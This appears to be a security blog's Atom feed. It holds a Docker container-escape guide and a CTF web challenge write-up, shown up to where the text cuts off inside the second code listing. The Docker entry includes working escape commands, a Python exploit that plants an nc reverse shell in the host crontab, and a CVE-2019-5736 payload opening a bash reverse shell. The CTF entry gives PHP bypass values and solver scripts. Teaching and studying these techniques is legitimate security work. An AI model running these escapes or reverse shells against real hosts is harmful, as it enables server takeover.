<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TheTh1nk3r</title>
  
  
  <link href="https://theth1nk3r.github.io/atom.xml" rel="self"/>
  
  <link href="https://theth1nk3r.github.io/"/>
  <updated>2022-12-14T07:41:26.000Z</updated>
  <id>https://theth1nk3r.github.io/</id>
  
  <author>
    <name>TheTh1nk3r</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>docker逃逸总结</title>
    <link href="https://theth1nk3r.github.io/2021/09/27/docker%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/"/>
    <id>https://theth1nk3r.github.io/2021/09/27/docker%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/</id>
    <published>2021-09-27T05:31:00.000Z</published>
    <updated>2022-12-14T07:41:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="0x00-检查是否在docker容器中"><a href="#0x00-检查是否在docker容器中" class="headerlink" title="0x00 检查是否在docker容器中"></a>0x00 检查是否在docker容器中</h2><p>通过以下两个地方来判断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 是否存在此文件</span><br><span class="line">/.dockerenv</span><br><span class="line"># 在其中是否包含docker字符串</span><br><span class="line">/proc/1/cgroup</span><br></pre></td></tr></table></figure><p>除了上面两种外还有其他方式判断，如检测mount、fdisk -l查看硬盘 、判断PID 1的进程名等也可用来辅助判断。</p><p>容器逃逸一键检测<br><a href="https://github.com/Xyntax/CDK/releases/tag/0.1.6">https://github.com/Xyntax/CDK/releases/tag/0.1.6</a></p><h2 id="0x01-Docker-Remote-API-未授权访问"><a href="#0x01-Docker-Remote-API-未授权访问" class="headerlink" title="0x01 Docker Remote API 未授权访问"></a>0x01 Docker Remote API 未授权访问</h2><blockquote><p>Docker Remote API 可以执行 Docker 命令，Docker 守护进程监听在 0.0.0.0，可直接调用 API 来操作 Docker</p></blockquote><p>Docker Remote API 是一个取代远程命令行界面（rcli）的REST API。Docker Remote API如配置不当可导致未授权访问，攻击者利用 docker client 或者 http 直接请求就可以访问这个 API，可能导致敏感信息泄露，攻击者也可以删除Docker上的数据。 攻击者可进一步利用Docker自身特性，直接访问宿主机上的敏感信息，或对敏感文件进行修改，最终完全控制服务器</p><p>漏洞判断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 返回目标宿主机运行容器信息，漏洞存在</span><br><span class="line"># 这个命令和在宿主机上运行docker ps类似</span><br><span class="line">docker -H tcp://172.19.101.34:2375 ps</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> docker</span><br><span class="line"></span><br><span class="line">client = docker.DockerClient(base_url=<span class="string">&#x27;http://your-ip:2375/&#x27;</span>)</span><br><span class="line">data = client.containers.run(<span class="string">&#x27;alpine:latest&#x27;</span>, <span class="string">r&#x27;&#x27;&#x27;sh -c &quot;echo &#x27;* * * * * /usr/bin/nc your-ip 21 -e /bin/sh&#x27; &gt;&gt; /tmp/etc/crontab&quot; &#x27;&#x27;&#x27;</span>, remove=<span class="literal">True</span>, volumes=&#123;<span class="string">&#x27;/etc&#x27;</span>: &#123;<span class="string">&#x27;bind&#x27;</span>: <span class="string">&#x27;/tmp/etc&#x27;</span>, <span class="string">&#x27;mode&#x27;</span>: <span class="string">&#x27;rw&#x27;</span>&#125;&#125;)</span><br></pre></td></tr></table></figure><h2 id="0x02-docker-sock挂载到容器内部"><a href="#0x02-docker-sock挂载到容器内部" class="headerlink" title="0x02 docker.sock挂载到容器内部"></a>0x02 docker.sock挂载到容器内部</h2><blockquote><p>当这样挂载时，在docker容器中可以调用和执行宿主机的docker<br>将docker宿主机的docker文件和docker.sock文件挂载到容器中</p></blockquote><p>在容器中查看宿主机docker信息</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H unix:///var/run/docker.sock info</span><br></pre></td></tr></table></figure><p>运行一个新容器并挂载宿主机根路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H unix:///var/run/docker.sock run -it -v /:/test ubuntu /bin/bash</span><br></pre></td></tr></table></figure><p>在新容器的 &#x2F;test 目录下，就可以访问到宿主机的全部资源，接下来就是写入 SSH 密钥或者写入计划任务，获取 shell</p><h2 id="0x03-Docker-高危启动参数"><a href="#0x03-Docker-高危启动参数" class="headerlink" title="0x03 Docker 高危启动参数"></a>0x03 Docker 高危启动参数</h2><blockquote><p>特权模式 –privileged</p><blockquote><p>使用特权模式启动的容器时，docker 管理员可通过 mount 命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令</p></blockquote></blockquote><h2 id="0x04-Docker-软件设计引起的逃逸"><a href="#0x04-Docker-软件设计引起的逃逸" class="headerlink" title="0x04 Docker 软件设计引起的逃逸"></a>0x04 Docker 软件设计引起的逃逸</h2><h3 id="1-4-1-CVE-2019-5736"><a href="#1-4-1-CVE-2019-5736" class="headerlink" title="1.4.1 CVE-2019-5736"></a>1.4.1 CVE-2019-5736</h3><blockquote><p>CVE-2019-5736 是 runC 的 CVE 漏洞编号，runC 最初是作为 Docker 的一部分开发的，后来作为一个单独的开源工具和库被提取出来，在 docker 整个架构的运行过程中，Containerd 向 docker 提供运行容器的 API，二者通过 grpc 进行交互。containerd 最后通过 runc 来实际运行容器。</p></blockquote><p>影响版本：</p><ul><li>docker version &lt;&#x3D;18.09.2</li><li>RunC version &lt;&#x3D;1.0-rc6</li></ul><p>利用条件：</p><p>攻击者可控 image，进一步控制生成的 container<br>攻击者具有某已存在容器的写权限，且可通过 docker exec 进入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载 poc</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/Frichetten/CVE-2019-5736-PoC</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改Payload</span></span><br><span class="line">vi main.go</span><br><span class="line">payload = <span class="string">&quot;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/172.19.0.1/4444 0&gt;&amp;1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译生成 payload</span></span><br><span class="line">CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拷贝到 docker 容器中执行</span></span><br><span class="line">docker <span class="built_in">cp</span> ./main 248f8b7d3c45:/tmp</span><br></pre></td></tr></table></figure><p>在容器中执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@d1b112ea4a5e:/tmp<span class="comment"># ./main</span></span><br><span class="line">[+] Overwritten /bin/sh successfully</span><br><span class="line">[+] Found the PID: 16</span><br><span class="line">[+] Successfully got the file handle</span><br><span class="line">[+] Successfully got write handle &amp;&#123;0xc8201231e0&#125;</span><br></pre></td></tr></table></figure><p>当管理员通过exec进入容器的时候，触发payload，从而达到逃逸</p><h3 id="1-4-2-CVE-2019-14271"><a href="#1-4-2-CVE-2019-14271" class="headerlink" title="1.4.2 CVE-2019-14271"></a>1.4.2 CVE-2019-14271</h3><p>Copy命令允许从容器、向容器中、或容器之间复制文件。语法与标准的unix cp命令非常相似。要从容器中复制<code>/var/logs</code>，语法是<code>docker cp container_name:/var/logs /some/host/path</code>。</p><p>可能的攻击场景有Docker用户从另一个Docker处复制文件：</p><ul><li>容器运行含有恶意libnss_*.so库的镜像</li><li>容器中含有被攻击者替换的libnss_*.so库</li></ul><p><a href="https://xz.aliyun.com/t/6806">https://xz.aliyun.com/t/6806</a><br><a href="https://driverxdw.github.io/2019/11/28/Docker-cp%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E-CVE-2019-14271-%E5%88%86%E6%9E%90/">docker-cp逃逸分析</a></p><h3 id="1-4-3-CVE-2019-13139"><a href="#1-4-3-CVE-2019-13139" class="headerlink" title="1.4.3 CVE-2019-13139"></a>1.4.3 CVE-2019-13139</h3><p><a href="https://staaldraad.github.io/post/2019-07-16-cve-2019-13139-docker-build/">https://staaldraad.github.io/post/2019-07-16-cve-2019-13139-docker-build/</a></p><h3 id="1-4-4-CVE-2020-15257"><a href="#1-4-4-CVE-2020-15257" class="headerlink" title="1.4.4 CVE-2020-15257"></a>1.4.4 CVE-2020-15257</h3><blockquote><p>Containerd 是一个控制 runC 的守护进程，提供命令行客户端和API，用于在一个机器上管理容器。在特定网络条件下，攻击者可通过访问containerd-shim API，从而实现Docker容器逃逸</p></blockquote><p><strong>影响版本：</strong></p><ul><li>containerd &lt; 1.4.3</li><li>containerd &lt; 1.3.9</li></ul><p><a href="https://www.freebuf.com/vuls/259292.html">cve-2020-15257复现</a></p><h2 id="0x05-内核漏洞"><a href="#0x05-内核漏洞" class="headerlink" title="0x05 内核漏洞"></a>0x05 内核漏洞</h2><h3 id="1-5-1-CVE-2016-5195"><a href="#1-5-1-CVE-2016-5195" class="headerlink" title="1.5.1 CVE-2016-5195"></a>1.5.1 CVE-2016-5195</h3><blockquote><p>Dirty Cow（CVE-2016-5195）是 Linux 内核中的权限提升漏洞，通过它可实现 Docker 容器逃逸，获得 root 权限的 shell。<br>Docker与宿主机共享内核，因此容器需要运行在存在Dirty Cow漏洞的宿主机里</p></blockquote><p><a href="https://github.com/scumjr/dirtycow-vdso">CVE-2016-5195-exp</a></p><h2 id="0x06-docker管理平台"><a href="#0x06-docker管理平台" class="headerlink" title="0x06 docker管理平台"></a>0x06 docker管理平台</h2><h3 id="1-6-1portainer后台拿shell"><a href="#1-6-1portainer后台拿shell" class="headerlink" title="1.6.1portainer后台拿shell"></a>1.6.1portainer后台拿shell</h3><p>创建容器挂载宿主机目录，通过chroot切换Shell</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;0x00-检查是否在docker容器中&quot;&gt;&lt;a href=&quot;#0x00-检查是否在docker容器中&quot; class=&quot;headerlink&quot; title=&quot;0x00 检查是否在docker容器中&quot;&gt;&lt;/a&gt;0x00 检查是否在docker</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>第五届强网杯WEB-Writeup</title>
    <link href="https://theth1nk3r.github.io/2021/06/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWEB%20Writeup/"/>
    <id>https://theth1nk3r.github.io/2021/06/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWEB%20Writeup/</id>
    <published>2021-06-14T18:05:00.000Z</published>
    <updated>2022-12-18T11:58:54.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="0x01-强网先锋-寻宝"><a href="#0x01-强网先锋-寻宝" class="headerlink" title="0x01 [强网先锋]寻宝"></a>0x01 [强网先锋]寻宝</h2><p>根据题目信息可以知道，需要从中获取两个KEY，然后获得flag<br><img src="/2021/06/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWEB%20Writeup/2246609-20210614223400128-361303609.png" alt="image-20210614215702710"><br><strong>题目源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$filter_word</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;index&#x27;</span>,<span class="string">&#x27;KeY1lhv&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\(&#x27;</span>,<span class="string">&#x27;\.&#x27;</span>,<span class="string">&#x27;num&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;\/&#x27;</span>,<span class="string">&#x27;\,&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;0000000&#x27;</span>);</span><br><span class="line">        <span class="variable">$filter_phrase</span>= <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_word</span>).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter_phrase</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ppp</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$ppp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number1&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number2&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;nunber3&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number4&#x27;</span>] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number5&#x27;</span>] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$num1</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$ppp</span>[<span class="string">&#x27;number1&#x27;</span>]);        </span><br><span class="line"><span class="variable">$num2</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$ppp</span>[<span class="string">&#x27;number2&#x27;</span>]);        </span><br><span class="line"><span class="variable">$num3</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$ppp</span>[<span class="string">&#x27;number3&#x27;</span>]);        </span><br><span class="line"><span class="variable">$num4</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$ppp</span>[<span class="string">&#x27;number4&#x27;</span>]);</span><br><span class="line"><span class="variable">$num5</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$ppp</span>[<span class="string">&#x27;number5&#x27;</span>]);    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num1</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;非数字&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num1</span> &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;第一层&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num2</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$num2</span>) &lt;= <span class="number">4</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num2</span> + <span class="number">1</span>) &gt; <span class="number">500000</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;第二层&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num3</span>) &amp;&amp; <span class="string">&#x27;4bf21cd&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$num3</span>),<span class="number">0</span>,<span class="number">7</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;第三层&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span>(!(<span class="variable">$num4</span> &lt; <span class="number">0</span>)&amp;&amp;(<span class="variable">$num4</span> == <span class="number">0</span>)&amp;&amp;(<span class="variable">$num4</span> &lt;= <span class="number">0</span>)&amp;&amp;(<span class="title function_ invoke__">strlen</span>(<span class="variable">$num4</span>) &gt; <span class="number">6</span>)&amp;&amp;(<span class="title function_ invoke__">strlen</span>(<span class="variable">$num4</span>) &lt; <span class="number">8</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$num4</span>) )&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;第四层&quot;</span>;</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$num5</span>)||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$num5</span>)==<span class="number">0</span>)) <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">                    <span class="variable">$b</span>=<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$num5</span>);</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$y</span> = <span class="variable">$b</span> === <span class="literal">NULL</span>)&#123;</span><br><span class="line">                                <span class="keyword">if</span>(<span class="variable">$y</span> === <span class="literal">true</span>)&#123;</span><br><span class="line">                                    <span class="keyword">echo</span> <span class="string">&quot;第五层&quot;</span>;</span><br><span class="line">                                    <span class="keyword">include</span> <span class="string">&#x27;KeY1lhv.php&#x27;</span>;</span><br><span class="line">                                    <span class="keyword">echo</span> <span class="variable">$KEY1</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no111&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="KEY1："><a href="#KEY1：" class="headerlink" title="KEY1："></a><strong>KEY1：</strong></h3><p>第一层，字符串比较，构造$num1&#x3D;1027a绕过</p><p><img src="/2021/06/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWEB%20Writeup/2246609-20210614223358344-1981836785.png"></p><p>第二层，需要绕过 intval() ，使用科学计数法绕过 $num2&#x3D;6e5</p><p><img src="/2021/06/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWEB%20Writeup/2246609-20210614223357235-1252557655.png"></p><p>第三层，写脚本跑md5， $num3&#x3D;61823470</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_encode</span>(<span class="params">num3</span>):    </span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(num3.encode()).hexdigest()[<span class="number">0</span>:<span class="number">7</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60000000</span>,<span class="number">700000000</span>):</span><br><span class="line">    num3 = md5_encode(<span class="built_in">str</span>(i))</span><br><span class="line">    <span class="comment"># print(num3)</span></span><br><span class="line">    <span class="keyword">if</span> num3 == <span class="string">&#x27;4bf21cd&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span>  </span><br></pre></td></tr></table></figure><p><img src="/2021/06/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWEB%20Writeup/2246609-20210614223356950-1379802400.png"></p><p><img src="/2021/06/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWEB%20Writeup/2246609-20210614223356695-265567264.png"></p><p>第四层，同样使用科学计数法绕过，构造$num4&#x3D;0e00000</p><p><img src="/2021/06/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWEB%20Writeup/2246609-20210614223356460-1791573423.png"></p><p>第五层，利用json_decode在解析非json格式数据的时候会自动置NULL绕过, 构造$num5&#x3D;aaa</p><p><img src="/2021/06/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWEB%20Writeup/2246609-20210614223356192-1751174898.png"></p><p>得到KEY1：<strong>KEY1{e1e1d3d40573127e9ee0480caf1283d6}</strong></p><h3 id="KEY2："><a href="#KEY2：" class="headerlink" title="KEY2："></a><strong>KEY2：</strong></h3><p>根据题目描述，使用支持自动分片下载的工具下载文件</p><p><img src="/2021/06/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWEB%20Writeup/2246609-20210614223354909-1674775425.png"></p><p>解压后得到一堆docx文件</p><p><img src="/2021/06/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWEB%20Writeup/2246609-20210614223353922-503500523.png" alt="image-20210614220819093"></p><p>随便打开一个发现是一堆字符，猜测KEY2就在其中某一个文件中，写脚本跑</p><p><img src="/2021/06/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWEB%20Writeup/2246609-20210614223353526-298994114.png"><br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> docx</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        path = <span class="string">&quot;./5.&#123;0&#125;/VR_&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line"></span><br><span class="line">        files = os.listdir(path)</span><br><span class="line">        <span class="comment"># print(filePath)</span></span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                fileName = path+<span class="string">&quot;/&quot;</span>+file</span><br><span class="line">                <span class="comment"># print(fileName)</span></span><br><span class="line">                file = docx.Document(fileName)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">for</span> content <span class="keyword">in</span> file.paragraphs:</span><br><span class="line">                    <span class="comment"># print(content.text)</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&quot;KEY2&#123;&quot;</span> <span class="keyword">in</span> content.text:</span><br><span class="line">                        <span class="built_in">print</span>(content.text)</span><br><span class="line">                        <span class="built_in">print</span>(fileName)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><img src="/2021/06/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWEB%20Writeup/2246609-20210614223353207-665193747.png"></p><p>得到KEY2 ： <strong>KEY2{T5fo0Od618l91SlG6l1l42l3a3ao1nblfsS}</strong></p><p>在原页面上提交获取flag：</p><p><img src="/2021/06/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWEB%20Writeup/2246609-20210614223352970-2125627308.png"></p><h2 id="0x02-强网先锋-赌徒"><a href="#0x02-强网先锋-赌徒" class="headerlink" title="0x02 [强网先锋]赌徒"></a>0x02 [强网先锋]赌徒</h2><p>根据提示，扫目录在<a href="http://www.zip下得到源码/">www.zip下得到源码</a></p><p><img src="/2021/06/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWEB%20Writeup/2246609-20210614223352732-1070879995.png"><br><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span 